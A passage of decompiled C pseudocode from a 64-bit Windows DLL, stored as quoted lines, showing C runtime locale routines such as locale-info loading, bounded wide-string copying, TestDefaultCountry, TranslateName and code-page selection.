    "    v10 = *(_QWORD *)(a1 + 328);",
    "    v11 = sub_18002B354(&v21, 1, v10, 0xEu, (LPVOID *)v3);",
    "    v12 = sub_18002B354(&v21, 1, v10, 0xFu, (LPVOID *)v3 + 1) | v11;",
    "    v13 = sub_18002B354(&v21, 1, v10, 0x10u, (LPVOID *)v3 + 2) | v12;",
    "    v14 = sub_18002B354(&v21, 2, v10, 0xEu, (LPVOID *)v3 + 11) | v13;",
    "    if ( v14 | (unsigned int)sub_18002B354(&v21, 2, v10, 0xFu, (LPVOID *)v3 + 12) )",
    "    {",
    "      _free_lconv_num((XSAVE_FORMAT **)v3);",
    "      sub_180023374((XSAVE_FORMAT *)v3);",
    "      sub_180023374(v9);",
    "      v5 = -1;",
    "      goto LABEL_14;",
    "    }",
    "    v15 = v3[2];",
    "    while ( 1 )",
    "    {",
    "      v16 = *v15;",
    "      if ( !*v15 )",
    "      {",
    "        *(_DWORD *)&v2->ControlWord = 1;",
    "        *(_DWORD *)&v9->ControlWord = 1;",
    "        goto LABEL_27;",
    "      }",
    "      if ( (unsigned __int8)(v16 - 48) <= 9u )",
    "        break;",
    "      if ( v16 == 59 )",
    "      {",
    "        v17 = v15;",
    "        do",
    "        {",
    "          v18 = v17[1];",
    "          *v17++ = v18;",
    "        }",
    "        while ( v18 );",
    "      }",
    "      else",
    "      {",
    "LABEL_18:",
    "        ++v15;",
    "      }",
    "    }",
    "    *v15 = v16 - 48;",
    "    goto LABEL_18;",
    "  }",
    "  *v3 = off_18004B210;",
    "  v3[1] = off_18004B218;",
    "  v3[2] = off_18004B220;",
    "  v3[11] = off_18004B268;",
    "  v3[12] = off_18004B270;",
    "  *(_DWORD *)&v2->ControlWord = 1;",
    "LABEL_26:",
    "  v9 = 0;",
    "LABEL_27:",
    "  v19 = *(volatile signed __int32 **)(a1 + 232);",
    "  if ( v19 )",
    "    _InterlockedDecrement(v19);",
    "  v20 = *(volatile signed __int32 **)(a1 + 224);",
    "  if ( v20 )",
    "  {",
    "    if ( _InterlockedExchangeAdd(v20, 0xFFFFFFFF) == 1 )",
    "    {",
    "      sub_180023374(*(XSAVE_FORMAT **)(a1 + 224));",
    "      sub_180023374(*v4);",
    "    }",
    "  }",
    "  *(_QWORD *)(a1 + 232) = v9;",
    "  result = 0;",
    "  *(_QWORD *)(a1 + 224) = v2;",
    "  *v4 = (XSAVE_FORMAT *)v3;",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_180030A84(XSAVE_FORMAT **a1, __int64 a2)",
    "{",
    "  XSAVE_FORMAT **v2; // rdi",
    "  XSAVE_FORMAT **i; // rbx",
    "",
    "  v2 = &a1[a2];",
    "  for ( i = a1; i != v2; ++i )",
    "    sub_180023374(*i);",
    "}",
    "",
    "",
    "bool __fastcall sub_180030AB8(__int64 a1, unsigned __int64 a2)",
    "{",
    "  __m128i *v2; // r14",
    "  int v4; // esi",
    "  LCTYPE v5; // r15d",
    "  __int64 v6; // r13",
    "  LPVOID *v7; // rdi",
    "  int v8; // esi",
    "  int v9; // esi",
    "  int v10; // esi",
    "  LCTYPE v11; // r15d",
    "  __int64 v12; // r13",
    "  LPVOID *v13; // rdi",
    "  int v14; // esi",
    "  int v15; // esi",
    "  int v16; // esi",
    "  int v17; // esi",
    "  int v18; // eax",
    "  int v19; // esi",
    "  int v20; // esi",
    "  int v21; // esi",
    "  int v22; // esi",
    "  int v23; // esi",
    "  int v24; // eax",
    "  int v25; // esi",
    "  int v26; // esi",
    "  __int128 v28; // [rsp+30h] [rbp-10h] BYREF",
    "",
    "  v2 = *(__m128i **)(a2 + 336);",
    "  v4 = 0;",
    "  v28 = a2;",
    "  *(_QWORD *)(a1 + 696) = sub_18002693C(v2);",
    "  v5 = 49;",
    "  v6 = 7;",
    "  do",
    "  {",
    "    v7 = (LPVOID *)(a1 + 8LL * ((v5 - 48) % 7));",
    "    v8 = sub_18002B354(&v28, 1, (__int64)v2, v5, v7) | v4;",
    "    v9 = sub_18002B354(&v28, 1, (__int64)v2, v5 - 7, v7 + 7) | v8;",
    "    v10 = sub_18002B354(&v28, 2, (__int64)v2, v5, v7 + 44) | v9;",
    "    v4 = sub_18002B354(&v28, 2, (__int64)v2, v5 - 7, v7 + 51) | v10;",
    "    ++v5;",
    "    --v6;",
    "  }",
    "  while ( v6 );",
    "  v11 = 56;",
    "  v12 = 12;",
    "  v13 = (LPVOID *)(a1 + 208);",
    "  do",
    "  {",
    "    v14 = sub_18002B354(&v28, 1, (__int64)v2, v11 + 12, v13 - 12) | v4;",
    "    v15 = sub_18002B354(&v28, 1, (__int64)v2, v11, v13) | v14;",
    "    v16 = sub_18002B354(&v28, 2, (__int64)v2, v11 + 12, v13 + 32) | v15;",
    "    v4 = sub_18002B354(&v28, 2, (__int64)v2, v11, v13 + 44) | v16;",
    "    ++v13;",
    "    ++v11;",
    "    --v12;",
    "  }",
    "  while ( v12 );",
    "  v17 = sub_18002B354(&v28, 1, (__int64)v2, 0x28u, (LPVOID *)(a1 + 304)) | v4;",
    "  v18 = sub_18002B354(&v28, 1, (__int64)v2, 0x29u, (LPVOID *)(a1 + 312));",
    "  v19 = sub_18002B354(&v28, 2, (__int64)v2, 0x28u, (LPVOID *)(a1 + 656)) | v18 | v17;",
    "  v20 = sub_18002B354(&v28, 2, (__int64)v2, 0x29u, (LPVOID *)(a1 + 664)) | v19;",
    "  v21 = sub_18002B354(&v28, 1, (__int64)v2, 0x1Fu, (LPVOID *)(a1 + 320)) | v20;",
    "  v22 = sub_18002B354(&v28, 1, (__int64)v2, 0x20u, (LPVOID *)(a1 + 328)) | v21;",
    "  v23 = sub_18002B354(&v28, 1, (__int64)v2, 0x1003u, (LPVOID *)(a1 + 336)) | v22;",
    "  v24 = sub_18002B354(&v28, 0, (__int64)v2, 0x1009u, (LPVOID *)(a1 + 344));",
    "  v25 = sub_18002B354(&v28, 2, (__int64)v2, 0x1Fu, (LPVOID *)(a1 + 672)) | v24 | v23;",
    "  v26 = sub_18002B354(&v28, 2, (__int64)v2, 0x20u, (LPVOID *)(a1 + 680)) | v25;",
    "  return (v26 | (unsigned int)sub_18002B354(&v28, 2, (__int64)v2, 0x1003u, (LPVOID *)(a1 + 688))) == 0;",
    "}",
    "",
    "",
    "void __fastcall sub_180030DF8(XSAVE_FORMAT **a1)",
    "{",
    "  if ( a1 )",
    "  {",
    "    sub_180030A84(a1, 7);",
    "    sub_180030A84(a1 + 7, 7);",
    "    sub_180030A84(a1 + 14, 12);",
    "    sub_180030A84(a1 + 26, 12);",
    "    sub_180030A84(a1 + 38, 2);",
    "    sub_180023374(a1[40]);",
    "    sub_180023374(a1[41]);",
    "    sub_180023374(a1[42]);",
    "    sub_180030A84(a1 + 44, 7);",
    "    sub_180030A84(a1 + 51, 7);",
    "    sub_180030A84(a1 + 58, 12);",
    "    sub_180030A84(a1 + 70, 12);",
    "    sub_180030A84(a1 + 82, 2);",
    "    sub_180023374(a1[84]);",
    "    sub_180023374(a1[85]);",
    "    sub_180023374(a1[86]);",
    "    sub_180023374(a1[87]);",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180030F00(unsigned __int64 a1)",
    "{",
    "  XSAVE_FORMAT *v1; // rdi",
    "  _UNKNOWN **v3; // rbx",
    "  _UNKNOWN **v4; // rax",
    "  __int64 result; // rax",
    "",
    "  v1 = 0;",
    "  if ( *(_QWORD *)(a1 + 336) )",
    "  {",
    "    v4 = (_UNKNOWN **)sub_1800232FC(1u, 0x2C0u);",
    "    v3 = v4;",
    "    if ( v4 )",
    "    {",
    "      if ( sub_180030AB8((__int64)v4, a1) )",
    "      {",
    "        *((_DWORD *)v3 + 87) = 1;",
    "        sub_180023374(0);",
    "        goto LABEL_8;",
    "      }",
    "      sub_180030DF8((XSAVE_FORMAT **)v3);",
    "      v1 = (XSAVE_FORMAT *)v3;",
    "    }",
    "    sub_180023374(v1);",
    "    return 1;",
    "  }",
    "  v3 = &off_18003E1E0;",
    "LABEL_8:",
    "  sub_18002E804(*(_QWORD *)(a1 + 288));",
    "  result = 0;",
    "  *(_QWORD *)(a1 + 288) = v3;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180030F9C(_WORD *a1, __int64 a2, __int64 a3)",
    "{",
    "  unsigned int v3; // ebx",
    "  _WORD *v4; // r9",
    "  _DWORD *v5; // rax",
    "  __int64 v7; // r8",
    "  __int16 v8; // ax",
    "",
    "  v3 = 0;",
    "  v4 = a1;",
    "  if ( !a1 || !a2 )",
    "  {",
    "LABEL_5:",
    "    v5 = sub_18001A80C();",
    "    v3 = 22;",
    "LABEL_6:",
    "    *v5 = v3;",
    "    invalid_parameter_noinfo();",
    "    return v3;",
    "  }",
    "  if ( !a3 )",
    "  {",
    "    *a1 = 0;",
    "    goto LABEL_5;",
    "  }",
    "  while ( *a1 )",
    "  {",
    "    ++a1;",
    "    if ( !--a2 )",
    "    {",
    "      *v4 = 0;",
    "      goto LABEL_5;",
    "    }",
    "  }",
    "  v7 = a3 - (_QWORD)a1;",
    "  while ( 1 )",
    "  {",
    "    v8 = *(_WORD *)((char *)a1 + v7);",
    "    *a1++ = v8;",
    "    if ( !v8 )",
    "      return v3;",
    "    if ( !--a2 )",
    "    {",
    "      *v4 = 0;",
    "      v5 = sub_18001A80C();",
    "      v3 = 34;",
    "      goto LABEL_6;",
    "    }",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180031014(_WORD *a1, __int64 a2, char *a3, __int64 a4)",
    "{",
    "  unsigned int v4; // r10d",
    "  __int64 v5; // rbx",
    "  _WORD *v6; // r11",
    "  _DWORD *v7; // rax",
    "  unsigned int v8; // ebx",
    "  __int64 v10; // rdi",
    "  signed __int64 v11; // r8",
    "  __int16 v12; // ax",
    "  __int16 v13; // ax",
    "",
    "  v4 = 0;",
    "  v5 = a2;",
    "  v6 = a1;",
    "  if ( a4 )",
    "  {",
    "    if ( !a1 )",
    "      goto LABEL_4;",
    "LABEL_8:",
    "    if ( !a2 )",
    "      goto LABEL_4;",
    "    if ( a4 && !a3 )",
    "    {",
    "      *a1 = 0;",
    "      goto LABEL_4;",
    "    }",
    "    v10 = a4;",
    "    while ( *a1 )",
    "    {",
    "      ++a1;",
    "      if ( !--a2 )",
    "      {",
    "        *v6 = 0;",
    "        goto LABEL_4;",
    "      }",
    "    }",
    "    if ( a4 == -1 )",
    "    {",
    "      v11 = a3 - (char *)a1;",
    "      do",
    "      {",
    "        v12 = *(_WORD *)((char *)a1 + v11);",
    "        *a1++ = v12;",
    "        if ( !v12 )",
    "          break;",
    "        --a2;",
    "      }",
    "      while ( a2 );",
    "    }",
    "    else",
    "    {",
    "      if ( a4 )",
    "      {",
    "        while ( 1 )",
    "        {",
    "          v13 = *(_WORD *)a3;",
    "          a3 += 2;",
    "          *a1++ = v13;",
    "          if ( !v13 )",
    "            return v4;",
    "          if ( --a2 )",
    "          {",
    "            if ( --v10 )",
    "              continue;",
    "          }",
    "          break;",
    "        }",
    "      }",
    "      if ( !v10 )",
    "        *a1 = 0;",
    "    }",
    "    if ( a2 )",
    "      return v4;",
    "    if ( a4 == -1 )",
    "    {",
    "      v6[v5 - 1] = 0;",
    "      return 80;",
    "    }",
    "    *v6 = 0;",
    "    v7 = sub_18001A80C();",
    "    v8 = 34;",
    "    goto LABEL_5;",
    "  }",
    "  if ( a1 )",
    "    goto LABEL_8;",
    "  if ( a2 )",
    "  {",
    "LABEL_4:",
    "    v7 = sub_18001A80C();",
    "    v8 = 22;",
    "LABEL_5:",
    "    *v7 = v8;",
    "    invalid_parameter_noinfo();",
    "    return v8;",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18003110C(_WORD *a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  unsigned int v4; // r10d",
    "  _DWORD *v6; // rax",
    "  unsigned int v7; // ebx",
    "  __int64 v9; // rbx",
    "  _WORD *v10; // rdx",
    "  __int64 v11; // r8",
    "  __int64 v12; // rdi",
    "  __int16 v13; // ax",
    "  __int16 v14; // ax",
    "  __int64 v15; // rsi",
    "  __int64 v16; // rax",
    "",
    "  v4 = 0;",
    "  if ( a4 )",
    "  {",
    "    if ( !a1 )",
    "      goto LABEL_4;",
    "  }",
    "  else if ( !a1 )",
    "  {",
    "    if ( !a2 )",
    "      return v4;",
    "    goto LABEL_4;",
    "  }",
    "  if ( !a2 )",
    "  {",
    "LABEL_4:",
    "    v6 = sub_18001A80C();",
    "    v7 = 22;",
    "LABEL_5:",
    "    *v6 = v7;",
    "    invalid_parameter_noinfo();",
    "    return v7;",
    "  }",
    "  if ( !a4 )",
    "  {",
    "    *a1 = 0;",
    "    return v4;",
    "  }",
    "  if ( !a3 )",
    "  {",
    "    *a1 = 0;",
    "    goto LABEL_4;",
    "  }",
    "  v9 = a3 - (_QWORD)a1;",
    "  v10 = a1;",
    "  v11 = a2;",
    "  v12 = a4;",
    "  if ( a4 == -1 )",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v13 = *(_WORD *)((char *)v10 + v9);",
    "      *v10++ = v13;",
    "      if ( !v13 )",
    "        break;",
    "      if ( !--v11 )",
    "        goto LABEL_24;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v14 = *(_WORD *)((char *)v10 + v9);",
    "      v15 = v12;",
    "      *v10++ = v14;",
    "      if ( !v14 )",
    "        break;",
    "      if ( --v11 )",
    "      {",
    "        if ( --v12 )",
    "          continue;",
    "      }",
    "      v16 = v15 - 1;",
    "      if ( !v11 )",
    "        v16 = v15;",
    "      if ( !v16 )",
    "        *v10 = 0;",
    "LABEL_24:",
    "      if ( v11 )",
    "        return v4;",
    "      if ( a4 == -1 )",
    "      {",
    "        a1[a2 - 1] = 0;",
    "        return 80;",
    "      }",
    "      *a1 = 0;",
    "      v6 = sub_18001A80C();",
    "      v7 = 34;",
    "      goto LABEL_5;",
    "    }",
    "  }",
    "  return v4;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180031208(_WORD *a1, _WORD *a2)",
    "{",
    "  bool v3; // zf",
    "  _WORD *v4; // rax",
    "  _WORD *v5; // r9",
    "  __int16 v6; // dx",
    "",
    "  v3 = *a1 == 0;",
    "  v4 = a1;",
    "  while ( !v3 )",
    "  {",
    "    v5 = a2;",
    "    if ( *a2 )",
    "    {",
    "      v6 = *a2;",
    "      while ( *v4 != v6 )",
    "      {",
    "        v6 = *++v5;",
    "        if ( !*v5 )",
    "          goto LABEL_7;",
    "      }",
    "      return v4 - a1;",
    "    }",
    "LABEL_7:",
    "    v3 = *++v4 == 0;",
    "  }",
    "  return v4 - a1;",
    "}",
    "",
    "",
    "_WORD *__fastcall sub_180031248(_WORD *a1, _WORD *a2)",
    "{",
    "  _WORD *v2; // r8",
    "  __int16 v3; // ax",
    "",
    "  while ( 1 )",
    "  {",
    "    if ( !*a1 )",
    "      return 0;",
    "    v2 = a2;",
    "    if ( *a2 )",
    "      break;",
    "LABEL_6:",
    "    ++a1;",
    "  }",
    "  v3 = *a2;",
    "  while ( v3 != *a1 )",
    "  {",
    "    v3 = *++v2;",
    "    if ( !*v2 )",
    "      goto LABEL_6;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18003127C(__int64 a1)",
    "{",
    "  __int64 result; // rax",
    "  __int64 v3; // r9",
    "  _WORD v4[88]; // [rsp+30h] [rbp-C8h] BYREF",
    "",
    "  *(_DWORD *)(a1 + 16) |= 0x104u;",
    "  result = sub_18002380C((__int64)v4, 0x55u);",
    "  if ( (int)result > 1 )",
    "  {",
    "    v3 = -1;",
    "    do",
    "      ++v3;",
    "    while ( v4[v3] );",
    "    result = sub_18003110C((_WORD *)(a1 + 600), 85, (__int64)v4, v3 + 1);",
    "    if ( (_DWORD)result )",
    "    {",
    "      sub_18001A6B4();",
    "      JUMPOUT(0x180031320LL);",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "bool __fastcall sub_180031324(__int64 a1)",
    "{",
    "  __int16 *v1; // rdx",
    "  __int64 v2; // r8",
    "  __int64 v4; // rcx",
    "  int v5; // ecx",
    "  int v6; // r9d",
    "  __int16 v7; // r8",
    "  bool result; // al",
    "",
    "  v1 = *(__int16 **)a1;",
    "  v2 = -1;",
    "  v4 = -1;",
    "  do",
    "    ++v4;",
    "  while ( v1[v4] );",
    "  *(_DWORD *)(a1 + 24) = v4 == 3;",
    "  do",
    "    ++v2;",
    "  while ( *(_WORD *)(*(_QWORD *)(a1 + 8) + 2 * v2) );",
    "  *(_DWORD *)(a1 + 28) = v2 == 3;",
    "  if ( v4 == 3 )",
    "  {",
    "    v5 = 2;",
    "  }",
    "  else",
    "  {",
    "    v6 = 0;",
    "    if ( v1 )",
    "    {",
    "      while ( 1 )",
    "      {",
    "        v7 = *v1++;",
    "        if ( (unsigned __int16)(v7 - 65) > 0x19u && (unsigned __int16)(v7 - 97) > 0x19u )",
    "          break;",
    "        ++v6;",
    "      }",
    "      v5 = v6;",
    "    }",
    "    else",
    "    {",
    "      v5 = 0;",
    "    }",
    "  }",
    "  *(_DWORD *)(a1 + 20) = v5;",
    "  sub_1800236BC((__int64)sub_18003148C, 3u, 0, 0);",
    "  result = (*(_DWORD *)(a1 + 16) & 0x100) != 0;",
    "  if ( (*(_DWORD *)(a1 + 16) & 0x200) == 0 || (*(_DWORD *)(a1 + 16) & 7) == 0 || !result )",
    "    *(_DWORD *)(a1 + 16) = 0;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800313F4(__int64 a1)",
    "{",
    "  __int16 *v1; // rdx",
    "  __int64 v2; // r8",
    "  int v4; // ecx",
    "  int v5; // r9d",
    "  __int16 v6; // r8",
    "  __int64 result; // rax",
    "",
    "  v1 = *(__int16 **)a1;",
    "  v2 = -1;",
    "  do",
    "    ++v2;",
    "  while ( v1[v2] );",
    "  *(_DWORD *)(a1 + 24) = v2 == 3;",
    "  if ( v2 == 3 )",
    "  {",
    "    v4 = 2;",
    "  }",
    "  else",
    "  {",
    "    v5 = 0;",
    "    if ( v1 )",
    "    {",
    "      while ( 1 )",
    "      {",
    "        v6 = *v1++;",
    "        if ( (unsigned __int16)(v6 - 65) > 0x19u && (unsigned __int16)(v6 - 97) > 0x19u )",
    "          break;",
    "        ++v5;",
    "      }",
    "      v4 = v5;",
    "    }",
    "    else",
    "    {",
    "      v4 = 0;",
    "    }",
    "  }",
    "  *(_DWORD *)(a1 + 20) = v4;",
    "  result = sub_1800236BC((__int64)sub_18003176C, 3u, 0, 0);",
    "  if ( (*(_BYTE *)(a1 + 16) & 4) == 0 )",
    "    *(_DWORD *)(a1 + 16) = 0;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18003148C(__int64 a1)",
    "{",
    "  __int64 v2; // rax",
    "  _QWORD *v3; // rbx",
    "  __int64 v5; // rdi",
    "  int v6; // eax",
    "  int v7; // ecx",
    "  __int64 v8; // r9",
    "  int v9; // eax",
    "  _WORD *v10; // rcx",
    "  __int64 v11; // rcx",
    "  __int16 *v12; // r9",
    "  int v13; // r8d",
    "  __int16 *v14; // rcx",
    "  __int16 v15; // dx",
    "  __int64 v16; // rax",
    "  WCHAR v17[64]; // [rsp+30h] [rbp-A8h] BYREF",
    "",
    "  v2 = sub_1800262FC();",
    "  v3 = (_QWORD *)(v2 + 152);",
    "  if ( !sub_18002377C(a1, *(_DWORD *)(v2 + 180) != 0 ? 7 : 4098, v17, 0x40u) )",
    "    goto LABEL_2;",
    "  v5 = -1;",
    "  if ( !(unsigned int)sub_18002C380(v3[1], (__int64)v17) )",
    "  {",
    "    if ( !sub_18002377C(a1, *((_DWORD *)v3 + 6) != 0 ? 3 : 4097, v17, 0x40u) )",
    "      goto LABEL_2;",
    "    v6 = sub_18002C380(*v3, (__int64)v17);",
    "    v7 = *((_DWORD *)v3 + 4);",
    "    if ( v6 )",
    "    {",
    "      if ( (v7 & 2) != 0 )",
    "        goto LABEL_20;",
    "      if ( !*((_DWORD *)v3 + 5) || (unsigned int)sub_180032CAC(*v3, v17, *((int *)v3 + 5)) )",
    "      {",
    "        if ( (v3[2] & 1) != 0 || !(unsigned int)TestDefaultCountry(a1) )",
    "          goto LABEL_20;",
    "        *((_DWORD *)v3 + 4) |= 1u;",
    "        v8 = -1;",
    "        do",
    "          ++v8;",
    "        while ( *(_WORD *)(a1 + 2 * v8) );",
    "      }",
    "      else",
    "      {",
    "        *((_DWORD *)v3 + 4) |= 2u;",
    "        v8 = -1;",
    "        do",
    "          ++v8;",
    "        while ( *(_WORD *)(a1 + 2 * v8) );",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v8 = -1;",
    "      *((_DWORD *)v3 + 4) = v7 | 0x304;",
    "      do",
    "        ++v8;",
    "      while ( *(_WORD *)(a1 + 2 * v8) );",
    "    }",
    "    if ( (unsigned int)sub_18003110C((_WORD *)v3 + 300, 85, a1, v8 + 1) )",
    "      goto LABEL_47;",
    "  }",
    "LABEL_20:",
    "  if ( (v3[2] & 0x300) == 0x300 )",
    "    return (v3[2] & 4) == 0;",
    "  if ( !sub_18002377C(a1, *((_DWORD *)v3 + 6) != 0 ? 3 : 4097, v17, 0x40u) )",
    "  {",
    "LABEL_2:",
    "    *((_DWORD *)v3 + 4) = 0;",
    "    return 1;",
    "  }",
    "  if ( !(unsigned int)sub_18002C380(*v3, (__int64)v17) )",
    "  {",
    "    v9 = *((_DWORD *)v3 + 4) | 0x200;",
    "    *((_DWORD *)v3 + 4) = v9;",
    "    if ( !*((_DWORD *)v3 + 6) )",
    "    {",
    "      if ( !*((_DWORD *)v3 + 5) )",
    "        goto LABEL_44;",
    "      v11 = -1;",
    "      do",
    "        ++v11;",
    "      while ( *(_WORD *)(*v3 + 2 * v11) );",
    "      if ( (_DWORD)v11 == *((_DWORD *)v3 + 5) )",
    "      {",
    "        if ( !(unsigned int)TestDefaultCountry(a1) )",
    "        {",
    "          v12 = (__int16 *)*v3;",
    "          v13 = 0;",
    "          v14 = (__int16 *)*v3;",
    "          if ( *v3 )",
    "          {",
    "            v15 = *v12;",
    "            while ( 1 )",
    "            {",
    "              ++v14;",
    "              if ( (unsigned __int16)(v15 - 65) > 0x19u && (unsigned __int16)(v15 - 97) > 0x19u )",
    "                break;",
    "              v15 = *v14;",
    "              ++v13;",
    "            }",
    "          }",
    "          v16 = -1;",
    "          do",
    "            ++v16;",
    "          while ( v12[v16] );",
    "          if ( v13 == (_DWORD)v16 )",
    "            return (v3[2] & 4) == 0;",
    "        }",
    "        *((_DWORD *)v3 + 4) |= 0x100u;",
    "        v10 = v3 + 75;",
    "        if ( *((_WORD *)v3 + 300) )",
    "          return (v3[2] & 4) == 0;",
    "        do",
    "          ++v5;",
    "        while ( *(_WORD *)(a1 + 2 * v5) );",
    "      }",
    "      else",
    "      {",
    "LABEL_44:",
    "        v10 = v3 + 75;",
    "        *((_DWORD *)v3 + 4) = v9 | 0x100;",
    "        if ( *((_WORD *)v3 + 300) )",
    "          return (v3[2] & 4) == 0;",
    "        do",
    "          ++v5;",
    "        while ( *(_WORD *)(a1 + 2 * v5) );",
    "      }",
    "LABEL_42:",
    "      if ( !(unsigned int)sub_18003110C(v10, 85, a1, v5 + 1) )",
    "        return (v3[2] & 4) == 0;",
    "LABEL_47:",
    "      sub_18001A6B4();",
    "      JUMPOUT(0x18003176ALL);",
    "    }",
    "    v10 = v3 + 75;",
    "    *((_DWORD *)v3 + 4) = v9 | 0x100;",
    "    if ( !*((_WORD *)v3 + 300) )",
    "    {",
    "      do",
    "        ++v5;",
    "      while ( *(_WORD *)(a1 + 2 * v5) );",
    "      goto LABEL_42;",
    "    }",
    "  }",
    "  return (v3[2] & 4) == 0;",
    "}",
    "",
    "",
    "_BOOL8 __fastcall sub_18003176C(__int64 a1)",
    "{",
    "  __int64 v2; // rax",
    "  __int64 v3; // rbx",
    "  __int64 v5; // r9",
    "  WCHAR v6[120]; // [rsp+30h] [rbp-108h] BYREF",
    "",
    "  v2 = sub_1800262FC();",
    "  v3 = v2 + 152;",
    "  if ( sub_18002377C(a1, *(_DWORD *)(v2 + 176) != 0 ? 3 : 4097, v6, 0x78u) )",
    "  {",
    "    if ( !(unsigned int)sub_18002C380(*(_QWORD *)v3, (__int64)v6) )",
    "    {",
    "      v5 = -1;",
    "      do",
    "        ++v5;",
    "      while ( *(_WORD *)(a1 + 2 * v5) );",
    "      if ( (unsigned int)sub_18003110C((_WORD *)(v3 + 600), 85, a1, v5 + 1) )",
    "      {",
    "        sub_18001A6B4();",
    "        JUMPOUT(0x180031855LL);",
    "      }",
    "      *(_DWORD *)(v3 + 16) |= 4u;",
    "    }",
    "    return (*(_DWORD *)(v3 + 16) & 4) == 0;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(v3 + 16) = 0;",
    "    return 1;",
    "  }",
    "}",
    "",
    "",
    "int __fastcall sub_180031858(__int16 *a1, __int64 a2)",
    "{",
    "  LCTYPE v4; // edx",
    "  int result; // eax",
    "  int v6; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  if ( a1 && *a1 && (unsigned int)sub_180035054(a1, L\"ACP\") )",
    "  {",
    "    if ( !(unsigned int)sub_18002C380((__int64)a1, (__int64)L\"utf8\")",
    "      || !(unsigned int)sub_18002C380((__int64)a1, (__int64)L\"utf-8\") )",
    "    {",
    "      return 65001;",
    "    }",
    "    if ( (unsigned int)sub_180035054(a1, L\"OCP\") )",
    "      return sub_180023184(a1);",
    "    v4 = 536870923;",
    "  }",
    "  else",
    "  {",
    "    v4 = 536875012;",
    "  }",
    "  result = sub_18002377C(a2 + 600, v4, (WCHAR *)&v6, 2u);",
    "  if ( result )",
    "  {",
    "    result = v6;",
    "    if ( v6 < 3 )",
    "      return 65001;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall TestDefaultCountry(_WORD *a1)",
    "{",
    "  unsigned int v2; // ebx",
    "  WCHAR v4[12]; // [rsp+20h] [rbp-28h] BYREF",
    "",
    "  v2 = 0;",
    "  if ( !sub_18002377C((__int64)a1, 0x59u, v4, 9u) )",
    "    return 0;",
    "  LOBYTE(v2) = (unsigned int)sub_1800232D0(v4, a1, 9) == 0;",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall TranslateName(__int64 a1, int a2, __int64 *a3)",
    "{",
    "  unsigned int v3; // ebx",
    "  int v5; // edi",
    "  int v7; // eax",
    "  int v8; // esi",
    "  bool v9; // zf",
    "  __int64 v10; // rbp",
    "",
    "  v3 = 0;",
    "  v5 = a2;",
    "  v7 = 1;",
    "  v8 = 0;",
    "  if ( a2 < 0 )",
    "  {",
    "LABEL_9:",
    "    v9 = v7 == 0;",
    "  }",
    "  else",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v9 = v7 == 0;",
    "      if ( !v7 )",
    "        break;",
    "      v10 = (v8 + v5) / 2;",
    "      v7 = sub_18002C380(*a3, *(_QWORD *)(16 * v10 + a1));",
    "      if ( v7 )",
    "      {",
    "        if ( v7 >= 0 )",
    "          v8 = v10 + 1;",
    "        else",
    "          v5 = v10 - 1;",
    "      }",
    "      else",
    "      {",
    "        *a3 = 16 * v10 + a1 + 8;",
    "      }",
    "      if ( v8 > v5 )",
    "        goto LABEL_9;",
    "    }",
    "  }",
    "  LOBYTE(v3) = v9;",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180031A1C(_WORD *a1, UINT *a2, WCHAR *a3)",
    "{",
    "  __int64 v6; // rax",
    "  __int64 v7; // rbx",
    "  __int64 v8; // r15",
    "  _WORD **v9; // rsi",
    "  UINT ACP; // eax",
    "  UINT v11; // ebx",
    "  __int64 v12; // r9",
    "",
    "  v6 = sub_1800262FC();",
    "  v7 = v6 + 152;",
    "  *(_DWORD *)(v6 + 168) = 0;",
    "  v8 = v6 + 752;",
    "  *(_QWORD *)(v6 + 152) = a1;",
    "  v9 = (_WORD **)(v6 + 160);",
    "  *(_WORD *)(v6 + 752) = 0;",
    "  *(_QWORD *)(v6 + 160) = a1 + 64;",
    "  if ( a1[64] )",
    "    TranslateName((__int64)&off_180042090, 22, (__int64 *)(v6 + 160));",
    "  if ( !**(_WORD **)v7 )",
    "  {",
    "    sub_18003127C(v7);",
    "    goto LABEL_13;",
    "  }",
    "  if ( **v9 )",
    "    sub_180031324(v7);",
    "  else",
    "    sub_1800313F4(v7);",
    "  if ( !*(_DWORD *)(v7 + 16) )",
    "  {",
    "    if ( (unsigned int)TranslateName((__int64)&off_180041C70, 64, (__int64 *)v7) )",
    "    {",
    "      if ( **v9 )",
    "        sub_180031324(v7);",
    "      else",
    "        sub_1800313F4(v7);",
    "    }",
    "LABEL_13:",
    "    if ( !*(_DWORD *)(v7 + 16) )",
    "      return 0;",
    "  }",
    "  if ( !a1 || *a1 || a1[128] )",
    "    ACP = sub_180031858((__int16 *)((unsigned __int64)(a1 + 128) & -(__int64)(a1 != 0)), v7);",
    "  else",
    "    ACP = GetACP();",
    "  v11 = ACP;",
    "  if ( ACP && ACP != 65000 && IsValidCodePage((unsigned __int16)ACP) )",
    "  {",
    "    if ( a2 )",
    "      *a2 = v11;",
    "    if ( !a3 )",
    "      return 1;",
    "    v12 = -1;",
    "    a3[144] = 0;",
    "    do",
    "      ++v12;",
    "    while ( *(_WORD *)(v8 + 2 * v12) );",
    "    if ( (unsigned int)sub_18003110C(a3 + 144, 85, v8, v12 + 1) )",
    "      goto LABEL_38;",
    "    if ( sub_18002377C((__int64)(a3 + 144), 0x1001u, a3, 0x40u)",
    "      && sub_18002377C((__int64)(a3 + 144), 0x1002u, a3 + 64, 0x40u)",
